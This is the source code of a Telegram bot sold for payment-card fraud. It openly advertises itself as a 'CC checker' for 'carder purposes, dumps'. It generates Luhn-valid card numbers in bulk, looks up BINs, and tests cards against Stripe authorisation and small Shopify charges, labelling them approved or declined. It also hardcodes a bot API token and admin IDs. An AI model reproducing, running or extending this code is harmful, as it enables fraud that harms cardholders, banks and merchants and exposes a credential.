import telebot
import time
import os
from datetime import datetime
from reg import reg
import threading
from bs4 import BeautifulSoup
import json
import os
import asyncio

#======== Api Import @OnlyXFanbot ==≠==


API_TOKEN = "8338517861:AAGRxLSUYn2ajOFSfhIMDe-OZwIS036weys"

bot = telebot.TeleBot(API_TOKEN)

command_usage = {}
BANK_NAME_FIXES = {}  

# Channel ID for forwarding reports
REPORT_CHANNEL_ID = -1001903160469
REQUIRED_CHANNEL = -1002311823274 




#============ Api Import ==≠=====≠==

from reg import reg

from stripe import st 
from Shopify import vbv
from ppc import ppc


# chk = Tele
# b3txt = multiple
# cchk = 
# au = ppc
# mass = 
# ustxt = st
# sh = vbv
# msh = vbv



DATA_FILE = "data.json"



def load_data():
    if not os.path.exists(DATA_FILE):
        with open(DATA_FILE, "w") as file:
            json.dump({}, file)
    try:
        with open(DATA_FILE, "r") as file:
            content = file.read().strip()
            return json.loads(content) if content else {}
    except (json.JSONDecodeError, ValueError):
        with open(DATA_FILE, "w") as file:
            json.dump({}, file)
        return {}

def save_data(data):
    with open(DATA_FILE, "w") as file:
        json.dump(data, file, indent=4)

@bot.message_handler(commands=["start"])
def start(message):
    def handle_start():
        user_id = str(message.from_user.id)
        name = message.from_user.first_name

        data = load_data()

        # Create new user if not exists
        if user_id not in data:
            data[user_id] = {
                "plan": "FREE",
                "timer": "none"
            }
            save_data(data)

        # Retrieve user's current plan
        plan = data[user_id].get("plan", "FREE")

        if plan == "FREE":
            bot.reply_to(message, """✦━━━[ ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ ᴄᴄ ᴄʜᴇᴄᴋᴇʀ ʙᴏᴛ ]━━━✦

⟡ ᴏɴʟʏ ᴀᴜᴛʜᴏʀɪᴢᴇᴅ ᴍᴇᴍʙᴇʀꜱ ᴄᴀɴ ᴜꜱᴇ ᴛʜɪꜱ ʙᴏᴛ
⟡ ᴜꜱᴇ /cmds ᴛᴏ ᴄʜᴇᴄᴋ all Gate
⟡ ꜰᴏʀ ᴍᴀꜱꜱ ᴄʜᴇᴄᴋ, Upload file
⟡ 𝟷 ᴅᴀʏ - $𝟹 / 𝟸𝟽𝟶 Rs ⭐️
⟡ ᴘᴀʏᴍᴇɴᴛ ᴍᴇᴛʜᴏᴅ ᴜsᴅᴛ 
⟡ ᴅᴍ ᴛᴏ ʙᴜʏ @Watchindiandog

ʙᴏᴛ ᴘᴏᴡᴇʀᴇᴅ ʙʏ @Watchindiandog""")

        else:
            bot.reply_to(
    message,
    f'''<b> ʜᴇʟʟᴏ, {name}  !
ʏᴏᴜ ᴀʀᴇ ᴇʟɪɢɪʙʟᴇ ᴛᴏ ᴜsᴇ ᴛʜɪs ғᴇᴀᴛᴜʀᴇ.

ᴛʜɪs ʙᴏᴛ ɪs ᴅᴇsɪɢɴᴇᴅ ғᴏʀ ᴍᴀss ᴜsᴇ ʙᴜᴛ ʜᴀs ʟɪᴍɪᴛᴇᴅ ᴀᴄᴄᴇss ғᴏʀ sᴇʟᴇᴄᴛᴇᴅ ɪɴᴅɪᴠɪᴅᴜᴀʟs.

⚠ ɴᴏᴛᴇ: ᴛʜɪs ɪs sᴛʀɪᴄᴛʟʏ ғᴏʀ  ᴄᴀʀᴅᴇʀ ᴘᴜʀᴘᴏsᴇs, ᴅᴜᴍᴘs, ᴏʀ ᴘᴇʀsᴏɴᴀʟ ᴄʜᴇᴄᴋs.
❌ ɴᴏᴛ ɪɴᴛᴇɴᴅᴇᴅ ғᴏʀ ɢᴇɴᴇʀᴀʟ ᴜsᴇʀs ᴏʀ ʙᴇɢɪɴɴᴇʀs.

🔹 ᴄʟɪᴄᴋ /cmds ᴛᴏ ᴠɪᴇᴡ ᴀᴠᴀɪʟᴀʙʟᴇ ᴄᴏᴍᴍᴀɴᴅs
🔹 sᴇɴᴅ ʏᴏᴜʀ ғɪʟᴇ, ᴀɴᴅ ɪ ᴡɪʟʟ ᴄʜᴇᴄᴋ ɪᴛ ғᴏʀ ʏᴏᴜ </b>''',
    parse_mode="HTML"
)

    # Run in thread to avoid blocking
    threading.Thread(target=handle_start).start()





# --- /help command ---
@bot.message_handler(commands=['help'])
def help_command(message):
    help_msg = '''<b>⚙️ Bot Commands</b>

🆔 /id – View account info  
🏓 /ping – Check bot latency'''
    bot.reply_to(message, help_msg, parse_mode='HTML')
    

@bot.message_handler(commands=['cmds'])
def send_command_list(message):
    msg = '''<b>📋 Available Commands:</b>

🔍 <b>Check Tools:</b>

• <code>/au</code> – Stripe Auth  
• <code>/mass</code> – Mass Stripe  

• <code>/sh</code> – Shopify charge $0.98  
• <code>/msh</code> – Mass charge Checker  

⚙️ <b>Generators:</b>
• <code>/gen</code> – Generator  

💳 <b>BIN Tools:</b>
• <code>/fl</code> – Filter CC  
• <code>/bin</code> – Lookhub BIN  
• <code>/mbin</code> – More BIN Tools  

🆔 <b>User Tools:</b>
• <code>/id</code> – Show Your Telegram ID  
'''
    bot.reply_to(message, msg, parse_mode='HTML')

# --- /ping command ---
@bot.message_handler(commands=['ping'])
def ping_command(message):
    start = time.time()
    sent = bot.reply_to(message, "🏓 Pinging...")
    end = time.time()
    latency = (end - start) * 1000
    bot.edit_message_text(chat_id=sent.chat.id,
                          message_id=sent.message_id,
                          text=f"🏓 Pong!\nLatency: <b>{int(latency)} ms</b>",
                          parse_mode='HTML')

# --- /id command ---
@bot.message_handler(commands=['id'])
def id_command(message):
    user = message.from_user
    user_id = user.id
    plan = get_user_plan(user_id)  # Get the user's actual plan

    id_info = f"""<b>ℹ️ User Info</b>

ID: <code>{user.id}</code>
Name: {user.first_name}
Username: @{user.username if user.username else "N/A"}
Plan: <b>{plan}</b>
System: 0.1 auth"""
    
    bot.reply_to(message, id_info, parse_mode='HTML')



import telebot
import re
import random
import time
import os
import csv
import pycountry
import requests

# Replace with your bot token

CSV_FILE = 'bins_all.csv'

# Bank name fixes (if you have a dictionary for this)
BANK_NAME_FIXES = {}  # Add your bank name fixes here if needed

def expand_bank_name(bank_name):
    words = bank_name.split()
    expanded_words = [BANK_NAME_FIXES.get(word, word) for word in words]
    return " ".join(expanded_words)

def get_bin_info_from_csv(fbin):
    if not os.path.exists(CSV_FILE):
        return None  # CSV file not found
    
    try:
        with open(CSV_FILE, mode='r', encoding='utf-8') as file:
            reader = csv.reader(file)
            for row in reader:
                if row[0] == fbin:
                    return {
                        "bin": row[0],
                        "country": row[1],
                        "flag": row[2],
                        "brand": row[3],
                        "type": row[4],
                        "level": row[5],
                        "bank": expand_bank_name(row[6])  # Expand issuer name
                    }
    except Exception as e:
        print(f"Error reading CSV: {e}")
        return None
    return None  # BIN not found

def get_country_name(code, fallback_country_name):
    try:
        country = pycountry.countries.get(alpha_2=code)
        return country.name if country else fallback_country_name
    except Exception as e:
        print(f"Error getting country name: {e}")
        return fallback_country_name

def luhn_algorithm(card_number):
    def digits_of(n):
        return [int(d) for d in str(n)]
    
    digits = digits_of(card_number)
    odd_digits = digits[-1::-2]
    even_digits = digits[-2::-2]
    checksum = sum(odd_digits)
    for d in even_digits:
        checksum += sum(digits_of(d * 2))
    return card_number if checksum % 10 == 0 else None

def generate_valid_card(bin_input):
    card_length = 16  # Default for Visa/Mastercard
    if bin_input.startswith("34") or bin_input.startswith("37"):  # AMEX
        card_length = 15

    card_number = bin_input + ''.join(str(random.randint(0, 9)) for _ in range(card_length - len(bin_input)))
    valid_card = luhn_algorithm(card_number)
    
    if valid_card:
        return valid_card
    else:
        return generate_valid_card(bin_input)  # Retry if invalid

@bot.message_handler(func=lambda message: message.text.lower().startswith('/gen') or message.text.lower().startswith('.gen'))
def handle_gen(message):
    user_id = str(message.from_user.id)
    plan = get_user_plan(user_id)

    if plan == 'FREE':
        bot.reply_to(message, '''<b>ɢᴀᴛᴇ ɴᴀᴍᴇ: Card generator Tools ♻️

✧ ᴍᴇssᴀɢᴇ: ᴏɴʟʏ ᴀᴜᴛʜᴏʀɪᴢᴇᴅ ᴍᴇᴍʙᴇʀꜱ
ᴄᴀɴ ᴜꜱᴇ ᴛʜɪꜱ ʙᴏᴛ ❌

✧ ᴘʟᴇᴀꜱᴇ ᴄᴏɴᴛᴀᴄᴛ ᴀᴅᴍɪɴ: ꜰᴏʀ ᴀᴜᴛʜᴏʀɪᴢᴀᴛɪᴏɴ
✧ ᴀᴅᴍɪɴ: @Watchindiandog</b>''', parse_mode="HTML")
        return
    gen_input = message.text.split()[1:]  # Get input after command

    if not gen_input:
        bot.reply_to(message, "<b>❌ Wrong Format</b>\n\n<b>Usage:</b>\nOnly Bin:\n<code>/gen 447697</code>\n\nWith Expiration:\n<code>/gen 447697|12</code>\n<code>/gen 447697|12|23</code>\n\nWith CVV:\n<code>/gen 447697|12|23|000</code>\n\nWith Custom Amount:\n<code>/gen 447697|12|23|000 100</code>", parse_mode="HTML")
        return

    gen_input = " ".join(gen_input)  # Merge input
    match = re.match(r'^(\d{6,19})(\|\d{2})?(\|\d{2})?(\|\d{3,4})?(?:\s+(\d+))?$', gen_input)

    if not match:
        bot.reply_to(message, "<b>❌ Wrong Format</b>\n\n<b>Usage:</b>\nOnly Bin:\n<code>/gen 447697</code>\n\nWith Expiration:\n<code>/gen 447697|12</code>\n<code>/gen 447697|12|23</code>\n\nWith CVV:\n<code>/gen 447697|12|23|000</code>\n\nWith Custom Amount:\n<code>/gen 447697|12|23|000 100</code>", parse_mode="HTML")
        return

    bin_input, month, year, cvv, amount = match.groups()
    month = month[1:] if month else None
    year = year[1:] if year else None
    cvv = cvv[1:] if cvv else None
    amount = int(amount) if amount else 10  # Default to 10 cards

    if amount > 10000:
        bot.reply_to(message, "<b>⚠️ Maximum limit is 10k</b>", parse_mode="HTML")
        return

    # Fetch BIN details from CSV
    bin_info = get_bin_info_from_csv(bin_input[:6])
    if bin_info is None:
        bot.reply_to(message, "𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐁𝐈𝐍 ⚠️\n\n𝐌𝐞𝐬𝐬𝐚𝐠𝐞: 𝐍𝐨 𝐕𝐚𝐥𝐢𝐝 𝐁𝐈𝐍 𝐰𝐚𝐬 𝐟𝐨𝐮𝐧𝐝 𝐢𝐧 𝐲�{o𝐮𝐫 𝐢𝐧𝐩𝐮𝐭.")
        return

    brand = bin_info.get("brand", "Unknown").upper()
    card_type = bin_info.get("type", "Unknown").upper()
    level = bin_info.get("level", "Unknown").upper()
    country = get_country_name(bin_info.get("country", "Unknown").upper(), "Unknown")
    country_flag = bin_info.get("flag", "🌐")
    bank = bin_info.get("bank", "Unknown").upper()

    # Send "Generating Cards..." and store the message object
    processing_msg = bot.reply_to(message, "🔄 Generating Cards...")

    start_time = time.perf_counter()
    cards = []

    for _ in range(amount):
        valid_card = generate_valid_card(bin_input)

        # Assign expiration date
        if month and year:
            expiration = f"{month.zfill(2)}|{year.zfill(2)}"
        elif month:
            expiration = f"{month.zfill(2)}|{random.randint(26, 30)}"
        elif year:
            expiration = f"{random.randint(1, 12):02}|{year.zfill(2)}"
        else:
            expiration = f"{random.randint(1, 12):02}|{random.randint(26, 30)}"

        # Assign CVV
        if bin_input.startswith("34") or bin_input.startswith("37"):
            cvv_code = str(random.randint(1000, 9999))  # 4-digit CVV for Amex
        else:
            cvv_code = cvv.zfill(3) if cvv else f"{random.randint(100, 999)}"

        card = f"{valid_card}|{expiration}|{cvv_code}"
        cards.append(f"<code>{card}</code>")

    elapsed_time = time.perf_counter() - start_time

    # Delete the "Generating Cards..." message
    bot.delete_message(chat_id=message.chat.id, message_id=processing_msg.message_id)

    if amount <= 10:
        response_msg = (
            f"- 𝐂𝐂 𝐆𝐞𝐧𝐚𝐫𝐚𝐭𝐞𝐝 𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥𝐲\n"
            f"- 𝐁𝐢𝐧 - <code>{bin_input}</code>\n"
            f"- 𝐀𝐦𝐨𝐮𝐧𝐭 - {amount}\n\n"
            f"{chr(10).join(cards)}\n\n"
            f"- 𝗜𝗻𝗳𝗼 - {brand} - {card_type} - {level}\n"
            f"- 𝐁𝐚𝐧𝐤 - {bank} 🏛\n"
            f"- 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 - {country} - {country_flag}\n\n"
        )
        bot.reply_to(message, response_msg, parse_mode="HTML")
    else:
        # Generate file for more than 10 cards
        filename = f"{bin_input}_generated_cards.txt"
        with open(filename, "w") as f:
            f.write("\n".join([card.replace("<code>", "").replace("</code>", "") for card in cards]))

        caption = (
            f"- 𝐁𝐢𝐧: <code>{bin_input}</code>\n"
            f"- 𝐀𝐦𝐨𝐮𝐧𝐭: {amount}\n\n"
            f"- 𝗜𝗻𝗳𝗼 - {brand} - {card_type} - {level}\n"
            f"- 𝐁𝐚𝐧𝐤 - {bank} 🏛\n"
            f"- 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 - {country} - {country_flag}\n"
        )

        bot.send_document(message.chat.id, open(filename, 'rb'), caption=caption, parse_mode="HTML")
        os.remove(filename)  # Clean up file after sending
import telebot
import csv
import pycountry
import os
import threading
from queue import Queue
import tempfile



CSV_FILE = 'bins_all.csv'


def expand_bank_name(bank_name):
    words = bank_name.split()
    expanded_words = [BANK_NAME_FIXES.get(word.lower(), word) for word in words]
    return " ".join(expanded_words)

def get_bin_info_from_csv(fbin):
    if not os.path.exists(CSV_FILE):
        return None  # CSV file not found
    
    try:
        with open(CSV_FILE, mode='r', encoding='utf-8') as file:
            reader = csv.reader(file)
            for row in reader:
                if row[0] == fbin:
                    return {
                        "bin": row[0],
                        "country": row[1],
                        "flag": row[2],
                        "brand": row[3],
                        "type": row[4],
                        "level": row[5],
                        "bank": expand_bank_name(row[6])  # Expand issuer name
                    }
    except Exception as e:
        print(f"Error reading CSV: {e}")
        return None
    return None  # BIN not found

def get_country_name(code, fallback_country_name):
    try:
        country = pycountry.countries.get(alpha_2=code)
        return country.name if country else fallback_country_name
    except Exception as e:
        print(f"Error getting country name: {e}")
        return fallback_country_name

# Format for single BIN (with <code> tags)
def format_single_bin_response(bin_info, fbin):
    brand = bin_info.get("brand", "N/A").upper()
    card_type = bin_info.get("type", "N/A").upper()
    level = bin_info.get("level", "N/A").upper()
    bank = bin_info.get("bank", "N/A").upper()
    country_code = bin_info.get("country", "N/A").upper()
    flag = bin_info.get("flag", "🏳️")
    country_full_name = get_country_name(country_code, country_code)

    return f"""
𝗕𝗜𝗡 𝗟𝗼𝗼𝗸𝘂𝗽 🔍

𝗕𝗜𝗡: <code>{fbin}</code>
𝗜𝗻𝗳𝗼: <code>{brand} - {card_type} - {level}</code>
𝗜𝘀𝘀𝘂𝗲𝗿: <code>{bank} 🏛</code>
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: <code>{country_full_name} {flag}</code>
"""

# Format for mass BIN (no <code> tags)
def format_mass_bin_response(bin_info, fbin):
    brand = bin_info.get("brand", "N/A").upper()
    card_type = bin_info.get("type", "N/A").upper()
    level = bin_info.get("level", "N/A").upper()
    bank = bin_info.get("bank", "N/A").upper()
    country_code = bin_info.get("country", "N/A").upper()
    flag = bin_info.get("flag", "🏳️")
    country_full_name = get_country_name(country_code, country_code)

    return f"""
𝗕𝗜𝗡 𝗟𝗼𝗼𝗸𝘂𝗽 🔍

𝗕𝗜𝗡: {fbin}
𝗜𝗻𝗳𝗼: {brand} - {card_type} - {level}
𝗜𝘀𝘀𝘂𝗲𝗿: {bank} 🏛
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country_full_name} {flag}
"""

# Single BIN lookup command
@bot.message_handler(commands=['bin', '.bin'])
def cmd_bin(message):
    user_id = str(message.from_user.id)
    plan = get_user_plan(user_id)

    if plan == 'FREE':
        bot.reply_to(message, '''<b>ɢᴀᴛᴇ ɴᴀᴍᴇ: Bin Lookhub Api Tools ♻️

✧ ᴍᴇssᴀɢᴇ: ᴏɴʟʏ ᴀᴜᴛʜᴏʀɪᴢᴇᴅ ᴍᴇᴍʙᴇʀꜱ
ᴄᴀɴ ᴜꜱᴇ ᴛʜɪꜱ ʙᴏᴛ ❌

✧ ᴘʟᴇᴀꜱᴇ ᴄᴏɴᴛᴀᴄᴛ ᴀᴅᴍɪɴ: ꜰᴏʀ ᴀᴜᴛʜᴏʀɪᴢᴀᴛɪᴏɴ
✧ ᴀᴅᴍɪɴ: @Watchindiandog</b>''', parse_mode="HTML")
        return
    try:
        parts = message.text.split()
        
        if len(parts) < 2:
            bot.reply_to(message, "♻️ Message: No BIN Found in your input ❌\n\nUsage: /bin [6 digit card no]")
            return
        
        fbin = parts[1][:6]
        checking_msg = bot.reply_to(message, "𝐂𝐡𝐞𝐜𝐤𝐢𝐧𝐠 𝐲𝐨𝐮𝐫 𝐁𝐈𝐍... 🔍", parse_mode="HTML")
        
        bin_info = get_bin_info_from_csv(fbin)
        
        if bin_info is None:
            bot.edit_message_text(
                "𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐁𝐈𝐍 ⚠️\n\n𝐌𝐞𝐬𝐬𝐚𝐠𝐞: 𝐍𝐨 𝐕𝐚𝐥𝐢𝐝 𝐁𝐈𝐍 𝐰𝐚𝐬 𝐟𝐨𝐮𝐧𝐝 𝐢𝐧 𝐲𝐨𝐮𝐫 𝐢𝐧𝐩𝐮𝐭.",
                chat_id=message.chat.id,
                message_id=checking_msg.message_id,
                parse_mode="HTML"
            )
            return

        response = format_single_bin_response(bin_info, fbin)  # Use single format with <code>
        bot.edit_message_text(
            response,
            chat_id=message.chat.id,
            message_id=checking_msg.message_id,
            parse_mode="HTML"
        )

    except Exception as e:
        bot.reply_to(message, f"⚠️ Error: {e}")

# Multi-BIN lookup with threading and text file output
def process_bin_queue(queue, results, lock):
    while not queue.empty():
        fbin = queue.get()
        bin_info = get_bin_info_from_csv(fbin)
        with lock:
            if bin_info:
                results.append(format_mass_bin_response(bin_info, fbin))  # Use mass format without <code>
            else:
                results.append(f"𝐁𝐈𝐍: {fbin} - 𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐨𝐫 𝐍𝐨𝐭 𝐅𝐨𝐮𝐧𝐝 ⚠️")
        queue.task_done()

@bot.message_handler(commands=['mbin', '.mbin'])
def cmd_mbin(message):
    user_id = str(message.from_user.id)
    plan = get_user_plan(user_id)

    if plan == 'FREE':
        bot.reply_to(message, '''<b>ɢᴀᴛᴇ ɴᴀᴍᴇ: Bin Lookhub Api Tools ♻️

✧ ᴍᴇssᴀɢᴇ: ᴏɴʟʏ ᴀᴜᴛʜᴏʀɪᴢᴇᴅ ᴍᴇᴍʙᴇʀꜱ
ᴄᴀɴ ᴜꜱᴇ ᴛʜɪꜱ ʙᴏᴛ ❌

✧ ᴘʟᴇᴀꜱᴇ ᴄᴏɴᴛᴀᴄᴛ ᴀᴅᴍɪɴ: ꜰᴏʀ ᴀᴜᴛʜᴏʀɪᴢᴀᴛɪᴏɴ
✧ ᴀᴅᴍɪɴ: @Watchindiandog</b>''', parse_mode="HTML")
        return
    try:
        parts = message.text.split()
        
        if len(parts) < 2:
            bot.reply_to(message, "♻️ Message: No BINs Found in your input ❌\n\nUsage: /mbin [bin1 bin2 bin3 ...]")
            return
        
        bins = [part[:6] for part in parts[1:] if len(part) >= 6]
        if not bins:
            bot.reply_to(message, "♻️ Message: No Valid BINs Found in your input ❌")
            return
        
        # Limit to 300 BINs
        bins = bins[:40]
        checking_msg = bot.reply_to(message, f"𝐂𝐡𝐞𝐜𝐤𝐢𝐧𝐠 {len(bins)} 𝐁𝐈𝐍𝐬... 🔍", parse_mode="HTML")
        
        # Threading setup
        queue = Queue()
        results = []
        lock = threading.Lock()
        max_threads = min(2, len(bins))  # Limit threads to 300 or number of BINs
        
        for fbin in bins:
            queue.put(fbin)
        
        threads = []
        for _ in range(max_threads):
            t = threading.Thread(target=process_bin_queue, args=(queue, results, lock))
            t.start()
            threads.append(t)
        
        for t in threads:
            t.join()
        
        # Write results to a temporary text file
        temp_file_path = tempfile.mktemp(suffix='.txt')
        with open(temp_file_path, 'w', encoding='utf-8') as temp_file:
            temp_file.write("𝗠𝘂𝗹𝘁𝗶-𝗕𝗜𝗡 𝗟𝗼𝗼𝗸𝘂𝗽 𝗥𝗲𝘀𝘂𝗹𝘁 🔍\n\n")
            temp_file.write("\n\n".join(results))
        
        # Edit the checking message to indicate file is being sent
        bot.edit_message_text(
            f"𝐂𝐡𝐞𝐜𝐤𝐢𝐧𝐠 𝐜𝐨𝐦𝐩𝐥𝐞𝐭𝐞! 𝐒𝐞𝐧𝐝𝐢𝐧𝐠 𝐫𝐞𝐬𝐮𝐥𝐭𝐬 𝐟𝐨𝐫 {len(bins)} 𝐁𝐈𝐍𝐬... 📄",
            chat_id=message.chat.id,
            message_id=checking_msg.message_id,
            parse_mode="HTML"
        )
        
        # Send the text file with custom name
        with open(temp_file_path, 'rb') as file:
            bot.send_document(
                chat_id=message.chat.id,
                document=file,
                caption=f"Results for {len(bins)} BINs",
                reply_to_message_id=message.message_id,
                visible_file_name="Mass Bins details.txt"  # Custom file name for display
            )
        
        # Delete the "Checking complete" message
        bot.delete_message(
            chat_id=message.chat.id,
            message_id=checking_msg.message_id
        )
        
        # Clean up the temporary file
        os.unlink(temp_file_path)

    except Exception as e:
        bot.reply_to(message, f"⚠️ Error: {e}")


from datetime import datetime
import threading
import json
import time
import requests
import telebot, types
import os
import csv
import pycountry
from collections import defaultdict, deque
import datetime as dt

command_usage = {}

CSV_FILE = 'bins_all.csv'



# --- .au Command ---

au_command_usage = {}  # To track rate limits

# --- Rate limit function ---
def check_au_rate_limit(user_id, cooldown):
    last_usage = au_command_usage.get(user_id)
    if last_usage:
        elapsed_time = (datetime.now() - last_usage).seconds
        if elapsed_time < cooldown:
            return cooldown - elapsed_time
    au_command_usage[user_id] = datetime.now()
    return 0

# --- .au / /au command handler ---
@bot.message_handler(func=lambda message: message.text.lower().startswith(('.au', '/au')))
def respond_to_au(message):
    user_id = message.from_user.id
    plan = get_user_plan(user_id)

    if plan == 'FREE':
        bot.reply_to(message, '''<b>ɢᴀᴛᴇ ɴᴀᴍᴇ: sᴛʀɪᴘᴇ ᴀᴜᴛʜ ♻️

✧ ᴍᴇssᴀɢᴇ: ᴏɴʟʏ ᴀᴜᴛʜᴏʀɪᴢᴇᴅ ᴍᴇᴍʙᴇʀꜱ
ᴄᴀɴ ᴜꜱᴇ ᴛʜɪꜱ ʙᴏᴛ ❌

✧ ᴘʟᴇᴀꜱᴇ ᴄᴏɴᴛᴀᴄᴛ ᴀᴅᴍɪɴ: ꜰᴏʀ ᴀᴜᴛʜᴏʀɪᴢᴀᴛɪᴏɴ
✧ ᴀᴅᴍɪɴ: @Watchindiandog</b>''', parse_mode="HTML")
        return

    # --- Extract CC ---
    try:
        cc = message.reply_to_message.text if message.reply_to_message else message.text
        cc = str(reg(cc))
    except:
        cc = 'None'

    if cc == 'None':
        bot.edit_message_text(
            chat_id=message.chat.id,
            message_id=bot.reply_to(message, "𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙔𝙤𝙪𝙧 𝘾𝙖𝙧𝙙𝙨...⌛").message_id,
            text='''<b>ɢᴀᴛᴇ ɴᴀᴍᴇ: sᴛʀɪᴘᴇ ᴀᴜᴛʜ ♻️

ᴍᴇssᴀɢᴇ: ɴᴏ ᴄᴄ ғᴏᴜɴᴅ ᴏʀ ɪɴᴄᴏʀʀᴇᴄᴛ ғᴏʀᴍᴀᴛ ❌

ᴜsᴀɢᴇ: /au ᴄᴄ|ᴍᴇs|ᴀɴᴏ|ᴄᴠᴠ</b>''',
            parse_mode="HTML"
        )
        return

    # --- Cooldown check ---
    cooldown = 35
    remaining_time = check_au_rate_limit(user_id, cooldown)
    if remaining_time > 0:
        bot.reply_to(message, f"<b>Try again after {remaining_time} seconds.</b>", parse_mode="HTML")
        return

    processing_msg = bot.reply_to(message, "𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙔𝙤𝙪𝙧 𝘾𝙖𝙧𝙙𝙨...⌛").message_id

    threading.Thread(target=process_au_command, args=(message, processing_msg, cc)).start()

# --- Main logic thread ---
def process_au_command(message, processing_msg_id, cc):
    gate = 'sᴛʀɪᴘᴇ ᴀᴜᴛʜ'
    start_time = time.time()

    try:
        last = asyncio.run(ppc(cc))
    except Exception:
        last = 'Error'

    bin_info = get_bin_info_from_csv(cc[:6])
    if bin_info:
        brand = bin_info.get('brand', 'Unknown')
        card_type = bin_info.get('type', 'Unknown')
        country = get_country_name(bin_info.get('country', 'Unknown'), 'Unknown')
        country_flag = bin_info.get('flag', '🏳️')
        bank = bin_info.get('bank', 'Unknown')
        level = bin_info.get('level', 'Unknown')
    else:
        brand = card_type = country = country_flag = bank = level = 'Unknown'

    execution_time = time.time() - start_time

    msg = f'''<b>𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅

𝗖𝗮𝗿𝗱: <code>{cc}</code>
𝐆𝐚𝐭𝐞𝐰𝐚𝐲: {gate}
𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: {last}

𝗜𝗻𝗳𝗼: <code>{cc[:6]} - {card_type} - {brand} - {level}</code>
𝐈𝐬𝐬𝐮𝐞𝐫: {bank}
𝐂𝐨𝐮𝐧𝐭𝐫𝐲: <code>{country} - {country_flag}</code>

𝗧𝗶𝗺𝗲: {execution_time:.2f} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬
</b>'''

    msgd = f'''<b>𝘿𝙚𝙘𝙡𝙞𝙣𝙚𝙙 ❌

𝗖𝗮𝗿𝗱: <code>{cc}</code>
𝐆𝐚𝐭𝐞𝐰𝐚𝐲: {gate}
𝐑𝐞𝐬𝐩𝗼𝗻𝘀𝗲: {last}

𝗜𝗻𝗳𝗼: <code>{cc[:6]} - {card_type} - {brand} - {level}</code>
𝐈𝐬𝐬𝐮𝐞𝐫: {bank}
𝐂𝐨𝐮𝐧𝐭𝐫𝐲: <code>{country} - {country_flag}</code>

𝗧𝗶𝗺𝗲: {execution_time:.2f} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬
</b>'''

    if any(keyword in last.lower() for keyword in ["funds", "invalid postal", "avs", "added", "duplicate", "approved", "allowed", "purchase"]):
        bot.edit_message_text(chat_id=message.chat.id, message_id=processing_msg_id, text=msg, parse_mode="HTML")
    else:
        bot.edit_message_text(chat_id=message.chat.id, message_id=processing_msg_id, text=msgd, parse_mode="HTML")


owners = ['5995041264', '8416135389','']  # Add your admin user IDs as strings

@bot.message_handler(commands=['nikal'])
def remove_user_plan(message):
    if str(message.from_user.id) not in owners:
        bot.reply_to(message, "⛔ You are not authorized to use this command.", parse_mode="HTML")
        return

    try:
        parts = message.text.split()
        if len(parts) != 2:
            bot.reply_to(message, "<b>❗ Usage: /remove [USER_ID]</b>", parse_mode="HTML")
            return

        user_id = parts[1]

        with open('data.json', 'r') as file:
            data = json.load(file)

        if user_id not in data:
            bot.reply_to(message, "<b>❌ User ID not found.</b>", parse_mode="HTML")
            return

        del data[user_id]

        with open('data.json', 'w') as file:
            json.dump(data, file, ensure_ascii=False, indent=4)

        bot.reply_to(message, f"<b>✅ Removed user {user_id} successfully.</b>", parse_mode="HTML")

    except Exception as e:
        print("Remove error:", e)
        bot.reply_to(message, "<b>❗ Error while removing user.</b>", parse_mode="HTML")
        
        
@bot.message_handler(commands=['user_vip'])
def list_vip_users(message):
    if str(message.from_user.id) not in owners:
        bot.reply_to(message, "⛔ You are not authorized to use this command.", parse_mode="HTML")
        return

    try:
        with open('data.json', 'r') as file:
            data = json.load(file)

        vip_users = []
        for user_id, info in data.items():
            if isinstance(info, dict):
                plan = info.get('plan', 'free')
                if plan.lower() != 'free':
                    expires = info.get('timer', 'N/A')
                    vip_users.append(f"👤 <code>{user_id}</code> - Plan: <b>{plan}</b>, Expires: <i>{expires}</i>")

        if not vip_users:
            bot.reply_to(message, "<b>📭 No VIP users found.</b>", parse_mode="HTML")
            return

        msg = "<b>💎 VIP Users:</b>\n\n" + "\n".join(vip_users)
        bot.reply_to(message, msg, parse_mode="HTML")

    except Exception as e:
        print("VIP list error:", e)
        bot.reply_to(message, "<b>❗ Failed to get VIP user list.</b>", parse_mode="HTML")            
    
    
    
    
import json, threading, random, string
from datetime import datetime, timedelta
from telebot import TeleBot



admins = [5995041264,8416135389]
DATA_FILE = "data.json"

# --- Utility Functions ---
def load_data():
    try:
        with open(DATA_FILE, 'r') as file:
            return json.load(file)
    except (FileNotFoundError, json.JSONDecodeError):
        return {}

def save_data(data):
    with open(DATA_FILE, 'w') as file:
        json.dump(data, file, ensure_ascii=False, indent=4)

# --- Redeem Command ---
@bot.message_handler(func=lambda message: message.text.lower().startswith('.redeem') or message.text.lower().startswith('/redeem'))
def redeem_key(message):
    def my_function():
        try:
            parts = message.text.split(' ')
            if len(parts) < 2:
                bot.reply_to(message, "<b>❗ Please provide a key: /redeem [KEY]</b>", parse_mode="HTML")
                return

            key = parts[1]
            data = load_data()

            if key not in data:
                bot.reply_to(message, "<b>❗ Invalid or already redeemed key.</b>", parse_mode="HTML")
                return

            key_data = data[key]
            plan = key_data['plan']
            key_time_str = key_data['time']
            key_expiry = datetime.strptime(key_time_str, "%Y-%m-%d %H:%M")

            user_id_str = str(message.from_user.id)
            now = datetime.now()

            user_data = data.get(user_id_str, {"plan": "free", "timer": None})

            existing_timer_str = user_data.get('timer')
            try:
                if existing_timer_str and isinstance(existing_timer_str, str) and existing_timer_str.lower() != 'none':
                    existing_timer = datetime.strptime(existing_timer_str, "%Y-%m-%d %H:%M")
                    if existing_timer > now:
                        key_expiry += (existing_timer - now)
            except Exception as e:
                print("Timer parse error:", e)

            data[user_id_str] = {
                "plan": plan,
                "timer": key_expiry.strftime("%Y-%m-%d %H:%M")
            }

            del data[key]
            save_data(data)

